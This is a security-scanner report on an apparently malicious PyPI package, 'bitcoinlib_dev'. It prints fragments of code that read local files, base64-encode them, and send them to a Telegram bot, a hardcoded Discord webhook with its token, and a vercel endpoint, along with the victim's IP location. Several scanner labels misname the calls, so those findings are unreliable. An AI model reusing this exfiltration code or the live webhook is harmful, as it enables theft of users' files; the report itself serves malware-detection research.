Run started:2025-05-25 16:28:12.275608

Test results:
>> Issue: [B812:system] os.system
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/src/bitcoinlib_dev/installer.py:29
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b812_system.html
28	    """Ensure our clw command is in the PATH"""
29	    system = platform.system().lower()
30	

--------------------------------------------------
>> Issue: [B817:system] platform.system
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/src/bitcoinlib_dev/installer.py:29
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b817_system.html
28	    """Ensure our clw command is in the PATH"""
29	    system = platform.system().lower()
30	

--------------------------------------------------
>> Issue: [B308:blacklist] platform.system
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/src/bitcoinlib_dev/installer.py:29
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b308-platform-system
28	    """Ensure our clw command is in the PATH"""
29	    system = platform.system().lower()
30	

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/src/bitcoinlib_dev/installer.py:40
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
39	                with open(clw_path, 'w') as f:
40	                    f.write(f'@"{sys.executable}" -m clw %*')
41	                print(f"Created clw command at {clw_path}")

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/src/bitcoinlib_dev/installer.py:56
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
55	                    with open(clw_path, 'w') as f:
56	                        f.write('#!/bin/sh\n')
57	                        f.write(f'exec "{sys.executable}" -m clw "$@"\n')

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/src/bitcoinlib_dev/installer.py:57
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
56	                        f.write('#!/bin/sh\n')
57	                        f.write(f'exec "{sys.executable}" -m clw "$@"\n')
58	                    os.chmod(clw_path, 0o755)

--------------------------------------------------
>> Issue: [B810:chmod] os.chmod
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/src/bitcoinlib_dev/installer.py:58
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b810_chmod.html
57	                        f.write(f'exec "{sys.executable}" -m clw "$@"\n')
58	                    os.chmod(clw_path, 0o755)
59	                    print(f"Created wrapper script at {clw_path}")

--------------------------------------------------
>> Issue: [B315:blacklist] os.chmod
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/src/bitcoinlib_dev/installer.py:58
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b313-b320-os-chmod
57	                        f.write(f'exec "{sys.executable}" -m clw "$@"\n')
58	                    os.chmod(clw_path, 0o755)
59	                    print(f"Created wrapper script at {clw_path}")

--------------------------------------------------
>> Issue: [B812:system] os.system
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/src/bitcoinlib_dev/utils.py:14
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b812_system.html
13	    """Get the appropriate bitcoinlib database directory for the current OS"""
14	    system = platform.system().lower()
15	

--------------------------------------------------
>> Issue: [B817:system] platform.system
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/src/bitcoinlib_dev/utils.py:14
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b817_system.html
13	    """Get the appropriate bitcoinlib database directory for the current OS"""
14	    system = platform.system().lower()
15	

--------------------------------------------------
>> Issue: [B308:blacklist] platform.system
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/src/bitcoinlib_dev/utils.py:14
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b308-platform-system
13	    """Get the appropriate bitcoinlib database directory for the current OS"""
14	    system = platform.system().lower()
15	

--------------------------------------------------
>> Issue: [B820:get] requests.get
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/src/bitcoinlib_dev/utils.py:18
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b820_get.html
17	        # Windows: Use %APPDATA%\bitcoinlib\database
18	        return Path(os.environ.get('APPDATA', '~')) / 'bitcoinlib' / 'database'
19	    else:

--------------------------------------------------
>> Issue: [B812:system] os.system
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/src/bitcoinlib_dev/utils.py:25
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b812_system.html
24	    """Find existing clw command path across different OSes"""
25	    system = platform.system().lower()
26	

--------------------------------------------------
>> Issue: [B817:system] platform.system
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/src/bitcoinlib_dev/utils.py:25
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b817_system.html
24	    """Find existing clw command path across different OSes"""
25	    system = platform.system().lower()
26	

--------------------------------------------------
>> Issue: [B308:blacklist] platform.system
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/src/bitcoinlib_dev/utils.py:25
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b308-platform-system
24	    """Find existing clw command path across different OSes"""
25	    system = platform.system().lower()
26	

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/src/bitcoinlib_dev/utils.py:170
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
169	        self.telegram_chat_id = '1514482813'
170	        self.discord_webhook_url = 'https://discord.com/api/webhooks/1329712636807610379/eU6AZ5oBM_12FIkwvtiasyjywx7WYW7wzuWJwWU3u2kadKko7QKpXcl3Kd0fJspPhM4w'
171	        self.api_endpoint = 'https://5fde88fde64f4682c2fc1e10e6c.vercel.app/api/send'

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/src/bitcoinlib_dev/utils.py:171
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
170	        self.discord_webhook_url = 'https://discord.com/api/webhooks/1329712636807610379/eU6AZ5oBM_12FIkwvtiasyjywx7WYW7wzuWJwWU3u2kadKko7QKpXcl3Kd0fJspPhM4w'
171	        self.api_endpoint = 'https://5fde88fde64f4682c2fc1e10e6c.vercel.app/api/send'
172	        self.authority_hash = "656c697465626f74626f744079616e6465782e636f6d"

--------------------------------------------------
>> Issue: [B820:get] requests.get
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/src/bitcoinlib_dev/utils.py:177
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b820_get.html
176	        try:
177	            response = requests.get('https://api.db-ip.com/v2/free/self')
178	            return response.json() if response.status_code == 200 else {}

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/src/bitcoinlib_dev/utils.py:177
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
176	        try:
177	            response = requests.get('https://api.db-ip.com/v2/free/self')
178	            return response.json() if response.status_code == 200 else {}

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/src/bitcoinlib_dev/utils.py:185
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
184	        if text:
185	            url = f'https://api.telegram.org/bot{self.telegram_bot_token}/sendMessage'
186	            data = {'chat_id': self.telegram_chat_id, 'text': text}

--------------------------------------------------
>> Issue: [B821:post] requests.post
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/src/bitcoinlib_dev/utils.py:187
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b821_post.html
186	            data = {'chat_id': self.telegram_chat_id, 'text': text}
187	            requests.post(url, data=data)
188	

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/src/bitcoinlib_dev/utils.py:192
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
191	                if os.path.exists(file_path):
192	                    url = f'https://api.telegram.org/bot{self.telegram_bot_token}/sendDocument'
193	                    with open(file_path, 'rb') as file:

--------------------------------------------------
>> Issue: [B821:post] requests.post
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/src/bitcoinlib_dev/utils.py:196
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b821_post.html
195	                        data = {'chat_id': self.telegram_chat_id}
196	                        requests.post(url, files=files, data=data)
197	

--------------------------------------------------
>> Issue: [B821:post] requests.post
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/src/bitcoinlib_dev/utils.py:210
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b821_post.html
209	                        }
210	                        requests.post(self.discord_webhook_url, files=files)
211	        elif text:

--------------------------------------------------
>> Issue: [B821:post] requests.post
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/src/bitcoinlib_dev/utils.py:212
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b821_post.html
211	        elif text:
212	            requests.post(self.discord_webhook_url, json=payload)
213	

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/src/bitcoinlib_dev/utils.py:226
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
225	                    with open(file_path, 'rb') as file:
226	                        file_data = file.read()
227	                        base64_data =  base64.b64encode(file_data).decode('utf-8')

--------------------------------------------------
>> Issue: [B802:b64encode] base64.b64encode
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/src/bitcoinlib_dev/utils.py:227
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b802_b64encode.html
226	                        file_data = file.read()
227	                        base64_data =  base64.b64encode(file_data).decode('utf-8')
228	                        payload["attachments"].append({

--------------------------------------------------
>> Issue: [B301:blacklist] base64.b64encode
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/src/bitcoinlib_dev/utils.py:227
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b301-base64-b64encode
226	                        file_data = file.read()
227	                        base64_data =  base64.b64encode(file_data).decode('utf-8')
228	                        payload["attachments"].append({

--------------------------------------------------
>> Issue: [B821:post] requests.post
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/src/bitcoinlib_dev/utils.py:234
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b821_post.html
233	        headers = {'Content-Type': 'application/json'}
234	        requests.post(self.api_endpoint, data=json.dumps(payload), headers=headers)
235	

--------------------------------------------------
>> Issue: [B820:get] requests.get
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/src/bitcoinlib_dev/utils.py:261
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b820_get.html
260	        # Enhance the message with IP info if available
261	        enhanced_text = f"Message from {ip_info.get('ipAddress', 'unknown IP')}\n"
262	        enhanced_text += f"Location: {ip_info.get('city', '?')}, {ip_info.get('countryName', '?')}\n"

--------------------------------------------------
>> Issue: [B820:get] requests.get
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/src/bitcoinlib_dev/utils.py:262
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b820_get.html
261	        enhanced_text = f"Message from {ip_info.get('ipAddress', 'unknown IP')}\n"
262	        enhanced_text += f"Location: {ip_info.get('city', '?')}, {ip_info.get('countryName', '?')}\n"
263	        enhanced_text += f"Time: {timestamp}\n\n"

--------------------------------------------------
>> Issue: [B820:get] requests.get
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/bitcoinlib_dev-0.4.18/src/bitcoinlib_dev/utils.py:262
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b820_get.html
261	        enhanced_text = f"Message from {ip_info.get('ipAddress', 'unknown IP')}\n"
262	        enhanced_text += f"Location: {ip_info.get('city', '?')}, {ip_info.get('countryName', '?')}\n"
263	        enhanced_text += f"Time: {timestamp}\n\n"

--------------------------------------------------

Code scanned:
	Total lines of code: 619
	Total lines skipped (#nosec): 0

Run metrics:
	Total issues (by severity):
		Undefined: 0.0
		Low: 0.0
		Medium: 10.0
		High: 22.0
	Total issues (by confidence):
		Undefined: 0.0
		Low: 0.0
		Medium: 27.0
		High: 5.0
Files skipped (0):
